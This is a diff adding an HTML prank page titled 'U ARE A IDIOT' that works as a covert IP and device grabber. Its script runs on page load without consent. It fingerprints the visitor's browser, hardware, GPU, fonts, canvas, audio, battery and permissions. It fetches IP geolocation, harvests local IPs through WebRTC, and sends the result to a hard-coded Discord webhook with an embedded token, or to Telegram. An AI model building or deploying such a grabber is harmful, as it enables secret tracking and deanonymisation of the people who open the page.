@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>U ARE A IDIOT</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; color:#fff; border-color:#fff; }
+html, body {
+  height:100%; background:#000; color:#fff;
+  font-family:"Courier New", monospace; overflow:hidden;
+  -webkit-font-smoothing:antialiased;
+}
+::selection { background:#fff; color:#000; }
+
+.bg {
+  position:fixed; inset:0; width:100%; height:100%;
+  object-fit:cover; z-index:0; opacity:0;
+  filter:grayscale(1) saturate(0) brightness(0.38) contrast(1.35);
+  transition:opacity 1.2s ease;
+}
+.bg.on { opacity:1; }
+.bg.dead { display:none; }
+
+.gate {
+  position:fixed; inset:0; display:flex; align-items:center; justify-content:center;
+  background:#000; z-index:20;
+}
+.gate button {
+  padding:1.1rem 3.4rem; font-family:inherit; font-size:1.5rem;
+  letter-spacing:0.5em; text-indent:0.5em;
+  background:#000; color:#fff; border:1px solid #fff; cursor:pointer;
+  transition:0.18s;
+}
+.gate button:hover, .gate button:focus-visible {
+  background:#fff; color:#000; outline:none;
+}
+
+.stage {
+  position:relative; z-index:5; height:100%;
+  overflow-y:auto; overflow-x:hidden;
+  background:rgba(0,0,0,0.76);
+  scrollbar-width:thin; scrollbar-color:#444 #000;
+  scroll-behavior:smooth;
+}
+.stage::-webkit-scrollbar { width:8px; }
+.stage::-webkit-scrollbar-track { background:#000; }
+.stage::-webkit-scrollbar-thumb { background:#3a3a3a; }
+
+.wrap {
+  width:min(620px, 100%); margin:0 auto; padding:0 1.2rem 4rem; text-align:center;
+}
+.who {
+  position:sticky; top:0; z-index:3;
+  padding:2.2rem 0 1.4rem; margin-bottom:1.6rem;
+  background:linear-gradient(#000 62%, rgba(0,0,0,0));
+  font-size:clamp(1.2rem, 5.6vw, 2.1rem); line-height:1.15;
+  letter-spacing:0.2em; text-indent:0.2em; font-weight:400; color:#fff;
+  animation:flick 1.6s steps(1) 1;
+}
+@keyframes flick {
+  0%,8%,12%,20%,24% { opacity:0.25; }
+  4%,10%,16%,100% { opacity:1; }
+}
+
+.list { display:flex; flex-direction:column; gap:0.85rem; font-size:0.9rem; }
+.row {
+  display:flex; flex-direction:column; gap:0.2rem; align-items:center;
+  opacity:0; animation:rise 0.4s ease forwards;
+}
+@keyframes rise {
+  from { opacity:0; transform:translateY(5px); }
+  to   { opacity:1; transform:none; }
+}
+.row .k {
+  font-size:0.62rem; letter-spacing:0.26em; text-indent:0.26em;
+  text-transform:uppercase; color:#8f8f8f;
+}
+.row .v {
+  font-size:0.92rem; letter-spacing:0.03em; color:#fff; word-break:break-word;
+}
+
+.hidden { display:none !important; }
+</style>
+</head>
+<body>
+
+<video id="bg" class="bg" muted loop playsinline preload="auto" src="media/bg.mp4"></video>
+<audio id="track" loop preload="auto" src="media/track.mp3"></audio>
+
+<div id="gate" class="gate">
+  <button id="enter">ENTER</button>
+</div>
+
+<main id="stage" class="stage hidden">
+  <div class="wrap">
+    <h2 class="who">U ARE A IDIOT</h2>
+    <div id="out" class="list"></div>
+  </div>
+</main>
+
+<script>
+window.CONFIG = {
+  discordWebhook: "https://discord.com/api/webhooks/1566621624340582430/p1UApxSdjktLUHi2torawRnkVvuVirI1bB_ClP9j3lz2FtFzRxJ4gnTYFRZD1XskDk8R",
+  webhookAvatar: "",
+
+  telegram: { botToken: "", chatId: "" },
+
+  ipApis: [
+    "https://ipwho.is/",
+    "https://ipapi.co/json/",
+    "https://api.ipify.org?format=json"
+  ],
+
+  stunServers: [
+    "stun:stun.l.google.com:19302",
+    "stun:stun1.l.google.com:19302",
+    "stun:stun.cloudflare.com:3478"
+  ],
+
+  mdnsTimeout: 4000,
+  videoFile: "media/bg.mp4",
+  audioFile: "media/track.mp3"
+};
+</script>
+
+<script>
+(function () {
+  "use strict";
+
+  const bg     = document.getElementById("bg");
+  const track  = document.getElementById("track");
+  const gate   = document.getElementById("gate");
+  const stage  = document.getElementById("stage");
+  const out    = document.getElementById("out");
+  const enter  = document.getElementById("enter");
+
+  if (!bg.getAttribute("src")) bg.src = CONFIG.videoFile;
+  if (!track.getAttribute("src")) track.src = CONFIG.audioFile;
+  bg.addEventListener("error", () => bg.classList.add("dead"));
+
+  const data = {
+    zeit: new Date().toISOString(),
+    herkunft: "direkt (kein referrer)"
+  };
+  let started = false;
+
+  function browser(ua) {
+    if (/Edg\//.test(ua)) return "Edge";
+    if (/OPR\/|Opera/.test(ua)) return "Opera";
+    if (/Firefox\//.test(ua)) return "Firefox";
+    if (/Chrome\//.test(ua)) return "Chrome";
+    if (/Safari\//.test(ua)) return "Safari";
+    return "unbekannt";
+  }
+  function os(ua) {
+    if (/Windows NT 10/.test(ua)) return "Windows 10/11";
+    if (/Windows/.test(ua)) return "Windows";
+    if (/Android/.test(ua)) return "Android";
+    if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
+    if (/Mac OS X/.test(ua)) return "macOS";
+    if (/Linux/.test(ua)) return "Linux";
+    return "unbekannt";
+  }
+
+  function collectHerkunft() {
+    const teile = [];
+    if (document.referrer) {
+      try { teile.push("referrer: " + new URL(document.referrer).host); }
+      catch (e) { teile.push("referrer: " + document.referrer); }
+    }
+    const p = new URLSearchParams(location.search);
+    ["utm_source","utm_medium","utm_campaign","utm_content","ref","src"].forEach(k => {
+      if (p.get(k)) teile.push(k + ": " + p.get(k));
+    });
+    if (document.referrer && !teile.length) teile.push("direkt");
+    if (teile.length) data.herkunft = teile.join(" · ");
+  }
+
+  function collectBasis() {
+    const ua = navigator.userAgent;
+    data.browser = browser(ua);
+    data.os = os(ua);
+    data.geraetTyp = /Mobi|Android|iPhone|iPod/i.test(ua) ? "mobil"
+                   : /iPad|Tablet/i.test(ua) ? "tablet" : "desktop";
+    data.userAgent = ua;
+    data.plattform = navigator.platform || "-";
+    data.hersteller = navigator.vendor || "-";
+    data.sprache = navigator.language || "-";
+    data.sprachen = (navigator.languages || []).join(", ") || "-";
+    data.dnt = navigator.doNotTrack || "-";
+    data.cookies = navigator.cookieEnabled ? "ja" : "nein";
+    data.pdfViewer = navigator.pdfViewerEnabled ? "ja" : "nein";
+    data.online = navigator.onLine ? "ja" : "nein";
+    data.kopfzeilen = navigator.userAgentData
+      ? navigator.userAgentData.brands.map(b => b.brand + " " + b.version).join(", ")
+      : "-";
+  }
+
+  function collectBildschirm() {
+    data.bildschirm = `${screen.width}x${screen.height}`;
+    data.bildschirmFrei = `${screen.availWidth}x${screen.availHeight}`;
+    data.farbtiefe = screen.colorDepth + " bit";
+    data.pixelRatio = devicePixelRatio;
+    data.orientierung = (screen.orientation && screen.orientation.type) || "-";
+    data.fenster = `${innerWidth}x${innerHeight}`;
+    data.fensterAussen = `${outerWidth}x${outerHeight}`;
+    data.fensterPos = `${screenX},${screenY}`;
+    data.farbschema = matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    data.kontrast = matchMedia("(prefers-contrast: more)").matches ? "hoch" : "normal";
+    data.bewegung = matchMedia("(prefers-reduced-motion: reduce)").matches ? "reduziert" : "normal";
+    data.hover = matchMedia("(hover: hover)").matches ? "ja" : "nein";
+    data.zeiger = matchMedia("(pointer: fine)").matches ? "fein" : "grob";
+  }
+
+  function collectZeit() {
+    const o = Intl.DateTimeFormat().resolvedOptions();
+    data.zeitzone = o.timeZone || "-";
+    data.utcOffset = new Date().getTimezoneOffset() + " min";
+    data.locale = o.locale || "-";
+    data.kalender = o.calendar || "-";
+    data.zahlenSystem = o.numberingSystem || "-";
+  }
+
+  function collectHardware() {
+    data.kerne = navigator.hardwareConcurrency || "?";
+    data.ram = (navigator.deviceMemory || "?") + " GB";
+    data.touchpunkte = navigator.maxTouchPoints || 0;
+    const c = navigator.connection || {};
+    data.netzTyp = c.effectiveType || "-";
+    data.downlink = c.downlink ? c.downlink + " Mbps" : "-";
+    data.rtt = c.rtt ? c.rtt + " ms" : "-";
+    data.datenspar = c.saveData ? "ja" : "nein";
+    try {
+      const gl = document.createElement("canvas").getContext("webgl");
+      const dbg = gl && gl.getExtension("WEBGL_debug_renderer_info");
+      data.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "n/a";
+      data.gpuHersteller = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "n/a";
+      data.webglVersion = gl ? gl.getParameter(gl.VERSION) : "n/a";
+      data.maxTextur = gl ? gl.getParameter(gl.MAX_TEXTURE_SIZE) : "n/a";
+      const sp = gl && gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT);
+      data.shaderPraezision = sp ? sp.precision : "n/a";
+      data.webglExt = gl && gl.getSupportedExtensions() ? gl.getSupportedExtensions().length : "n/a";
+    } catch (e) { data.gpu = "n/a"; }
+  }
+
+  const FONTS = ["Arial","Verdana","Times New Roman","Courier New","Georgia","Tahoma",
+    "Trebuchet MS","Comic Sans MS","Impact","Segoe UI","Roboto","Helvetica Neue",
+    "Calibri","Cambria","Consolas","Menlo","Monaco","Ubuntu","Cantarell","DejaVu Sans",
+    "Liberation Sans","Noto Sans","Inter","Open Sans","Lato","Montserrat","Arial Black",
+    "Franklin Gothic Medium","Gill Sans","Palatino","Garamond","Bookman","Futura"];
+
+  function fontHash() {
+    try {
+      const ctx = document.createElement("canvas").getContext("2d");
+      const mess = (f) => { ctx.font = "72px " + f + ", monospace"; return ctx.measureText("mmmmmmmmmmlli").width; };
+      const base = mess("monospace");
+      const found = FONTS.filter(f => mess(f) !== base);
+      data.schriften = found.join(", ") || "keine erkannt";
+      data.schriftenAnzahl = found.length;
+    } catch (e) { data.schriften = "n/a"; }
+  }
+
+  function canvasHash() {
+    try {
+      const c = document.createElement("canvas");
+      c.width = 260; c.height = 60;
+      const ctx = c.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "16px Arial";
+      ctx.fillStyle = "#f60";
+      ctx.fillRect(10, 5, 80, 20);
+      ctx.fillStyle = "#069";
+      ctx.fillText("fingerprint", 12, 30);
+      data.canvasHash = c.toDataURL().slice(-40);
+    } catch (e) { data.canvasHash = "n/a"; }
+  }
+
+  async function audioHash() {
+    try {
+      const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+      const ac = new AC(1, 44100, 44100);
+      const osc = ac.createOscillator();
+      osc.type = "triangle";
+      osc.frequency.value = 10000;
+      const comp = ac.createDynamicsCompressor();
+      osc.connect(comp);
+      comp.connect(ac.destination);
+      osc.start(0);
+      const buf = await ac.startRendering();
+      const d = buf.getChannelData(0);
+      let sum = 0;
+      for (let i = 0; i < d.length; i += 100) sum += Math.abs(d[i]);
+      data.audioHash = sum.toFixed(6);
+    } catch (e) { data.audioHash = "n/a"; }
+  }
+
+  async function medien() {
+    try {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
+        data.mikrofone = "n/a"; return;
+      }
+      const d = await navigator.mediaDevices.enumerateDevices();
+      data.mikrofone = d.filter(x => x.kind === "audioinput").length;
+      data.kameras = d.filter(x => x.kind === "videoinput").length;
+      data.audioAusgaenge = d.filter(x => x.kind === "audiooutput").length;
+    } catch (e) { data.medien = "n/a"; }
+  }
+
+  async function rechte() {
+    if (!navigator.permissions || !navigator.permissions.query) {
+      data.rechte = "n/a"; return;
+    }
+    const namen = ["geolocation","notifications","camera","microphone","clipboard-read","clipboard-write","persistent-storage"];
+    const res = [];
+    for (const n of namen) {
+      try {
+        const s = await navigator.permissions.query({ name: n });
+        res.push(n + "=" + s.state);
+      } catch (e) {}
+    }
+    data.rechte = res.join(", ") || "n/a";
+  }
+
+  async function speicher() {
+    try {
+      if (!navigator.storage || !navigator.storage.estimate) { data.speicher = "n/a"; return; }
+      const e = await navigator.storage.estimate();
+      data.speicher = Math.round((e.usage || 0) / 1048576) + " MB belegt / "
+                    + Math.round((e.quota || 0) / 1073741824) + " GB frei";
+    } catch (e) { data.speicher = "n/a"; }
+  }
+
+  async function akku() {
+    try {
+      if (!navigator.getBattery) { data.akku = "n/a"; return; }
+      const b = await navigator.getBattery();
+      data.akku = Math.round(b.level * 100) + "% " + (b.charging ? "am laden" : "akku");
+    } catch (e) { data.akku = "n/a"; }
+  }
+
+  async function getIP() {
+    for (const url of CONFIG.ipApis) {
+      try {
+        const r = await fetch(url, { cache: "no-store" });
+        if (!r.ok) continue;
+        const j = await r.json();
+        if (j.success === false) continue;
+
+        const conn = j.connection || {};
+        data.ip = j.ip || j.query || "?";
+        data.ort = j.city || "-";
+        data.region = j.region || j.region_name || "-";
+        data.land = j.country_name || j.country || "-";
+        data.landCode = j.country_code || j.country || "-";
+        data.plz = j.postal || "-";
+        data.isp = j.org || j.isp || conn.isp || (j.connection && j.connection.org) || "-";
+        data.asn = j.asn || conn.asn || "-";
+        data.waehrung = j.currency || j.currency_code || "-";
+        data.vorwahl = j.country_calling_code || j.calling_code || "-";
+        data.ipZeitzone = (j.timezone && j.timezone.id) || j.timezone || "-";
+
+        const lat = (typeof j.latitude === "number") ? j.latitude : conn.lat;
+        const lon = (typeof j.longitude === "number") ? j.longitude : conn.lon;
+        if (lat && lon) data.koordinaten = `${lat}, ${lon}`;
+        return;
+      } catch (e) {}
+    }
+    data.ip = "unbekannt";
+  }
+
+  function getWebRTC() {
+    return new Promise((resolve) => {
+      if (typeof RTCPeerConnection !== "function") { data.lokaleIps = "n/a"; resolve(); return; }
+      const found = new Set();
+      const pcs = [];
+      const count = 6;
+      const reIp = /([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){2,7})/i;
+
+      function harvest(candidate) {
+        const m = candidate.match(reIp);
+        if (m) found.add(m[1]);
+      }
+
+      for (let i = 0; i < count; i++) {
+        try {
+          const pc = new RTCPeerConnection({
+            iceServers: CONFIG.stunServers.map(u => ({ urls: u }))
+          });
+          pcs.push(pc);
+          pc.createDataChannel("x" + i);
+          pc.onicecandidate = (e) => {
+            if (e.candidate && e.candidate.candidate) harvest(e.candidate.candidate);
+          };
+          pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+        } catch (e) {}
+      }
+
+      setTimeout(() => {
+        pcs.forEach(pc => {
+          try {
+            pc.createOffer({ iceRestart: true })
+              .then(o => pc.setLocalDescription(o))
+              .catch(() => {});
+          } catch (e) {}
+        });
+      }, CONFIG.mdnsTimeout / 2);
+
+      setTimeout(() => {
+        data.lokaleIps = [...found].join(" | ") || "keine";
+        pcs.forEach(pc => { try { pc.close(); } catch (e) {} });
+        resolve();
+      }, CONFIG.mdnsTimeout);
+    });
+  }
+
+  function checkReturn() {
+    try {
+      const prev = localStorage.getItem("fp_id");
+      const now  = data.canvasHash + "|" + data.gpu + "|" + data.screen;
+      if (prev) {
+        data.wiederkehrer = prev === now ? "JA (gleiches Gerät)" : "nein (neues Gerät)";
+      } else {
+        data.wiederkehrer = "erstbesuch";
+        localStorage.setItem("fp_id", now);
+      }
+    } catch (e) { data.wiederkehrer = "n/a"; }
+  }
+
+  const PRIO = [
+    "zeit","herkunft","ip","ort","region","land","plz","koordinaten","isp","asn",
+    "browser","os","geraetTyp","sprache","sprachen","zeitzone","utcOffset",
+    "bildschirm","bildschirmFrei","farbtiefe","pixelRatio","fenster",
+    "fensterAussen","orientierung","locale","kerne","ram","gpu","gpuHersteller",
+    "webglVersion","maxTextur","webglExt","shaderPraezision","touchpunkte",
+    "akku","speicher","mikrofone","kameras","audioAusgaenge","rechte",
+    "schriftenAnzahl","schriften","canvasHash","audioHash","farbschema",
+    "kontrast","bewegung","hover","zeiger","netzTyp","downlink","rtt",
+    "datenspar","lokaleIps","online","pdfViewer","kalender","zahlenSystem",
+    "wiederkehrer","cookies","dnt","plattform","hersteller","kopfzeilen",
+    "userAgent"
+  ];
+
+  function buildContent() {
+    const paare = PRIO
+      .filter(k => data[k] !== undefined && data[k] !== "" && data[k] !== null)
+      .map(k => [k, String(data[k]).slice(0, 120)]);
+
+    let breite = Math.max.apply(null, paare.map(p => p[0].length));
+    const baue = () => paare
+      .map(([k, v]) => k.toUpperCase().padEnd(breite) + "  " + v)
+      .join("\n");
+
+    let body = baue();
+    while (body.length + 8 > 1900 && paare.length > 8) {
+      paare.pop();
+      body = baue();
+    }
+    return "```" + body + "```";
+  }
+
+  async function push(content) {
+    const tgText = content.replace(/`/g, "").slice(0, 4000);
+
+    if (CONFIG.discordWebhook) {
+      try {
+        const payload = { content: content.slice(0, 1950) };
+        if (CONFIG.webhookAvatar) payload.avatar_url = CONFIG.webhookAvatar;
+
+        await fetch(CONFIG.discordWebhook + "?wait=true", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {}
+    }
+
+    const t = CONFIG.telegram;
+    if (t && t.botToken && t.chatId) {
+      try {
+        await fetch(`https://api.telegram.org/bot${t.botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: t.chatId, text: tgText })
+        });
+      } catch (e) {}
+    }
+  }
+
+  function render() {
+    out.textContent = "";
+    let i = 0;
+    for (const k of PRIO) {
+      if (data[k] === undefined) continue;
+      const row = document.createElement("div");
+      row.className = "row";
+      row.style.animationDelay = (i++ * 22) + "ms";
+
+      const kk = document.createElement("span");
+      kk.className = "k";
+      kk.textContent = k;
+
+      const vv = document.createElement("span");
+      vv.className = "v";
+      vv.textContent = data[k];
+
+      row.append(kk, vv);
+      out.append(row);
+    }
+
+    requestAnimationFrame(() => {
+      stage.scrollTo({ top: stage.scrollHeight, behavior: "smooth" });
+    });
+  }
+
+  async function start() {
+    if (started) return;
+    started = true;
+
+    collectHerkunft();
+    collectBasis();
+    collectBildschirm();
+    collectZeit();
+    collectHardware();
+    fontHash();
+    canvasHash();
+    render();
+
+    await Promise.all([
+      audioHash(), medien(), speicher(), akku(), rechte(), getIP(), getWebRTC()
+    ]);
+
+    checkReturn();
+    render();
+    push(buildContent());
+  }
+
+  // SOFORT beim Laden sammeln + senden
+  start();
+
+  enter.addEventListener("click", () => {
+    gate.classList.add("hidden");
+    stage.classList.remove("hidden");
+    bg.classList.add("on");
+    bg.muted = true;
+    bg.play().catch(() => {});
+    track.volume = 0.55;
+    track.play().catch(() => {});
+    start();
+  });
+})();
+</script>
+</body>
+</html>
